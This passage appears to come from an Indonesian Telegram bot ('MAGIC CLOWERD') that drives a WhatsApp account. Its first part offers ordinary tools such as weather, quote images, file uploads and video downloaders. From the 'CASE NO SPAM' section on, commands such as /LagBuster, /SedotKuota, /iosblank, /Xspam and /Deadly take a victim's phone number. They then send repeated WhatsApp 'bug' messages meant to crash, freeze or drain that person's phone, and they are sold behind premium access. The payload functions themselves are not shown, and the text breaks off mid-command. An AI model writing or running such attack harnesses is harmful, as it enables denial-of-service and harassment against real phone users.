🌡️ Suhu: ${temp}°C
🤔 Terasa: ${feels}°C
💧 Kelembapan: ${humidity}%
💨 Angin: ${wind} km/h
📝 Kondisi: ${desc}
`;

    await ctx.reply(result);

    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("CUACA ERROR:", err.message);
    ctx.reply("❌ Gagal mengambil data cuaca.");
  }
});

bot.command("quote", async (ctx) => {
  try {
    const msgReply = ctx.message.reply_to_message;

    if (!msgReply) {
      return ctx.reply("❌ Reply pesan yang mau dijadikan quote!");
    }

    const axios = require("axios");

    const text = msgReply.text || msgReply.caption || "";

    if (!text) {
      return ctx.reply("❌ Pesan tidak memiliki teks.");
    }

    const name = msgReply.from.first_name || "User";

    const res = await axios.post(
      "https://bot.lyo.su/quote/generate",
      {
        type: "quote",
        format: "png",
        backgroundColor: "#0f0f0f",
        width: 512,
        height: 768,
        scale: 2,
        messages: [
          {
            entities: [],
            avatar: true,
            from: {
              id: 1,
              name: name,
              photo: {
                url: `https://api.dicebear.com/7.x/initials/png?seed=${encodeURIComponent(name)}`
              }
            },
            text: text,
            replyMessage: {}
          }
        ]
      },
      {
        responseType: "arraybuffer"
      }
    );

    await ctx.replyWithPhoto(
      { source: Buffer.from(res.data) },
      { caption: "💬 Quote iPhone Style" }
    );

  } catch (err) {
    console.log("QUOTE ERROR:", err.message);
    ctx.reply("❌ Gagal membuat quote.");
  }
});

bot.command("tourlvideo", async (ctx) => {
  try {
    let fileId;

    // ambil dari reply
    if (ctx.message.reply_to_message?.video) {
      fileId = ctx.message.reply_to_message.video.file_id;
    }

    // ambil dari kirim langsung
    else if (ctx.message.video) {
      fileId = ctx.message.video.file_id;
    }

    if (!fileId) {
      return ctx.reply("❌ Kirim / reply video dengan command /tourlvideo");
    }

    const msg = await ctx.reply("⏳ Uploading video...");

    const axios = require("axios");
    const FormData = require("form-data");

    // ambil file dari telegram
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const res = await axios.get(fileLink.href, {
      responseType: "stream",
    });

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", res.data, "video.mp4");

    // upload ke catbox
    const upload = await axios.post(
      "https://catbox.moe/user/api.php",
      form,
      { headers: form.getHeaders() }
    );

    const url = upload.data;

    if (!url || !url.startsWith("https")) {
      return ctx.reply("❌ Gagal upload video.");
    }

    await ctx.reply(`✅ Link Video:\n${url}`);

    // hapus loading
    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("TOURL VIDEO ERROR:", err.message);
    ctx.reply("❌ Error saat upload video.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    let fileId;

    // cek dari reply foto
    if (ctx.message.reply_to_message?.photo) {
      const photo = ctx.message.reply_to_message.photo;
      fileId = photo[photo.length - 1].file_id;
    }

    // cek dari kirim langsung
    else if (ctx.message.photo) {
      const photo = ctx.message.photo;
      fileId = photo[photo.length - 1].file_id;
    }

    if (!fileId) {
      return ctx.reply("❌ Kirim / reply foto dengan command /tourl");
    }

    const msg = await ctx.reply("⏳ Uploading...");

    // ambil file dari telegram
    const link = await ctx.telegram.getFileLink(fileId);

    // upload ke telegraph
    const form = new (require("form-data"))();
    const axios = require("axios");

    const res = await axios.get(link.href, {
      responseType: "stream",
    });

    form.append("file", res.data);

    const upload = await axios.post(
      "https://telegra.ph/upload",
      form,
      { headers: form.getHeaders() }
    );

    if (!upload.data || !upload.data[0]?.src) {
      return ctx.reply("❌ Gagal upload.");
    }

    const url = "https://telegra.ph" + upload.data[0].src;

    await ctx.reply(`✅ Link:\n${url}`);

    // hapus loading
    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("TOURL ERROR:", err.message);
    ctx.reply("❌ Error saat upload.");
  }
});

bot.command("cekbio", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ");
    let number = text[1];

    if (!number) {
      return ctx.reply("❌ Format:\n/cekbio 628xxxx");
    }

    number = number.replace(/[^0-9]/g, "");
    const jid = number + "@s.whatsapp.net";

    const msg = await ctx.reply("⏳ Sedang mengecek bio...");

    let bio;

    try {
      bio = await sock.fetchStatus(jid);
    } catch {
      return ctx.reply("❌ Gagal mengambil bio.");
    }

    if (!bio || !bio.status) {
      return ctx.reply("❌ Bio tidak ditemukan.");
    }

    await ctx.reply(
      `📱 Nomor: ${number}\n📝 Bio: ${bio.status}`
    );

    // hapus loading
    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("CEKBIO ERROR:", err.message);
    ctx.reply("❌ Terjadi error.");
  }
});

bot.command("youtube", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ");
    const url = text[1];

    if (!url) {
      return ctx.reply("❌ Format:\n/youtube <link>");
    }

    if (!url.includes("youtube.com") && !url.includes("youtu.be")) {
      return ctx.reply("❌ Link harus dari YouTube!");
    }

    const msg = await ctx.reply("⏳ Sedang diproses...");

    let video, title;

    // API 1
    try {
      const { data } = await require("axios").get(
        `https://api.agatz.xyz/api/ytmp4?url=${encodeURIComponent(url)}`
      );
      video = data?.data?.url;
      title = data?.data?.title;
    } catch {}

    // fallback API 2
    if (!video) {
      try {
        const { data } = await require("axios").get(
          `https://api.vreden.my.id/api/ytmp4?url=${encodeURIComponent(url)}`
        );
        video = data?.result?.url;
        title = data?.result?.title;
      } catch {}
    }

    if (!video) {
      return ctx.reply("❌ Gagal mengambil video.");
    }

    await ctx.replyWithVideo(
      { url: video },
      {
        caption: `🎬 ${title || "YouTube Video"}`,
      }
    );

    // hapus loading
    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("YT ERROR:", err.message);
    ctx.reply("❌ Error saat download.");
  }
});

bot.command("facebook", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ");
    const url = text[1];

    if (!url) {
      return ctx.reply("❌ Format:\n/facebook <link>");
    }

    if (!url.includes("facebook.com") && !url.includes("fb.watch")) {
      return ctx.reply("❌ Link harus dari Facebook!");
    }

    const msg = await ctx.reply("⏳ Sedang diproses...");

    let video;

    // API 1
    try {
      const { data } = await require("axios").get(
        `https://api.vreden.my.id/api/fbdown?url=${encodeURIComponent(url)}`
      );
      video = data?.result?.url;
    } catch {}

    // fallback API 2
    if (!video) {
      try {
        const { data } = await require("axios").get(
          `https://api.agatz.xyz/api/fbdown?url=${encodeURIComponent(url)}`
        );
        video = data?.data?.hd || data?.data?.sd;
      } catch {}
    }

    if (!video) {
      return ctx.reply("❌ Gagal mengambil video.");
    }

    await ctx.replyWithVideo(
      { url: video },
      { caption: "✅ Facebook Downloader" }
    );

    // hapus loading
    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("FB ERROR:", err.message);
    ctx.reply("❌ Error saat download.");
  }
});

bot.command("instagram", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ");
    const url = text[1];

    if (!url) {
      return ctx.reply("❌ Format:\n/instagram <link>");
    }

    if (!url.includes("instagram.com")) {
      return ctx.reply("❌ Link harus dari Instagram!");
    }

    const msg = await ctx.reply("⏳ Sedang diproses...");

    let video;

    // API 1
    try {
      const { data } = await require("axios").get(
        `https://api.vreden.my.id/api/igdl?url=${encodeURIComponent(url)}`
      );
      video = data?.result?.[0]?.url;
    } catch {}

    // fallback API 2
    if (!video) {
      try {
        const { data } = await require("axios").get(
          `https://api.agatz.xyz/api/igdl?url=${encodeURIComponent(url)}`
        );
        video = data?.data?.[0]?.url;
      } catch {}
    }

    if (!video) {
      return ctx.reply("❌ Gagal mengambil video.");
    }

    await ctx.replyWithVideo(
      { url: video },
      { caption: "✅ Instagram Downloader" }
    );

    // hapus loading
    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("IG ERROR:", err.message);
    ctx.reply("❌ Error saat download.");
  }
});

bot.command("tiktok", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ");
    const url = text[1];

    if (!url) {
      return ctx.reply("❌ Format:\n/tiktok <link>");
    }

    if (!url.includes("tiktok.com")) {
      return ctx.reply("❌ Link harus dari TikTok!");
    }

    const msg = await ctx.reply("⏳ Sedang diproses...");

    // ambil data dari API
    const api = `https://www.tikwm.com/api/?url=${encodeURIComponent(url)}`;
    const { data } = await require("axios").get(api);

    if (!data || !data.data) {
      return ctx.reply("❌ Gagal mengambil video.");
    }

    const video = data.data.play; // no watermark
    const title = data.data.title;
    const author = data.data.author.nickname;

    await ctx.replyWithVideo(
      { url: video },
      {
        caption: `🎬 ${title}\n👤 ${author}`,
      }
    );

    // hapus pesan loading
    try {
      await ctx.deleteMessage(msg.message_id);
    } catch {}

  } catch (err) {
    console.log("TT ERROR:", err.message);
    ctx.reply("❌ Error saat download.");
  }
});
//------------------(AKHIR OF TOOLS)--------------------//

//------------------(CASE NO SPAM)--------------------//
bot.command("LagBuster", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /LagBuster 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 40;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Ghost Delay Work Beta
⌑ Status: Starting...
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await DelayNew(sock, target);
    await sleep(1200);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Ghost Delay Work Beta
⌑ Progress: ${i + 1}/${total} (${percent}%)
⌑ Status: Processing...
╘═——————————————═⬡</pre></blockquote>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}` }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Ghost Delay Work Beta
⌑ Status: Success ✅
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("SedotKuota", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /SedotKuota 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 50;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Draining For kuota you
⌑ Status: Starting...
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await AxDFesix(sock, target);
    await sleep(1200);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Draining For kuota you
⌑ Progress: ${i + 1}/${total} (${percent}%)
⌑ Status: Processing...
╘═——————————————═⬡</pre></blockquote>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}` }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Draining For kuota you
⌑ Status: Success ✅
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("iosblank", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /iosblank 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 50;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank ios for crash
⌑ Status: Starting...
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await SpyIos(sock, target);
    await sleep(1500);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank ios for crash
⌑ Progress: ${i + 1}/${total} (${percent}%)
⌑ Status: Processing...
╘═——————————————═⬡</pre></blockquote>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}` }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank ios for crash
⌑ Status: Success ✅
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("DelayVortex", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /DelayVortex 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 1;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: hard delay mentions
⌑ Status: Starting...
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await Tentacelz(sock, target);
    await sleep(1500);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: hard delay mentions
⌑ Progress: ${i + 1}/${total} (${percent}%)
⌑ Status: Processing...
╘═——————————————═⬡</pre></blockquote>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}` }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: hard delay mentions 
⌑ Status: Success ✅
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("Clown", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Clown 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 50;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Invisible
⌑ Status: Starting...
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await DelayNew(sock, target);
    await sleep(1800);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Invisible
⌑ Progress: ${i + 1}/${total} (${percent}%)
⌑ Status: Processing...
╘═——————————————═⬡</pre></blockquote>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}` }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay Invisible
⌑ Status: Success ✅
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("Magic", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Magic 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 50;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay for you here 
⌑ Status: Starting...
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await DelayNew(sock, target);
    await sleep(1800);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay for you here 
⌑ Progress: ${i + 1}/${total} (${percent}%)
⌑ Status: Processing...
╘═——————————————═⬡</pre></blockquote>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}` }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay for you here 
⌑ Status: Success ✅
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("Blank", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Blank 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 5;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank Visible 5 Message 
⌑ Status: Starting...
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await GaisyVisi(sock, target);
    await sleep(1800);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank Visible 5 Message 
⌑ Progress: ${i + 1}/${total} (${percent}%)
⌑ Status: Processing...
╘═——————————————═⬡</pre></blockquote>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}` }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>⬡═―—⊱ ⎧ MAGIC CLOWERD ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank Visible 5 Message 
⌑ Status: Success ✅
╘═——————————————═⬡</pre></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});
//------------------(CASE BEBAS SPAM)--------------------//
bot.command("Xspam", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }
  
  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Xspam 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ Xspam process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await Delayhard(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Xspam bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Xspam bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Deadly", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }
  
  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Deadly 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ Deadly process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await Delayhard(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Deadly bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Deadly bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("Vortex", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }
  
  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Vortex 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `✅ Vortex process mengirim for ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await Delayhard(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Vortex bug selesai untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `✅ Vortex bug gagal for ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("svipdelay", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
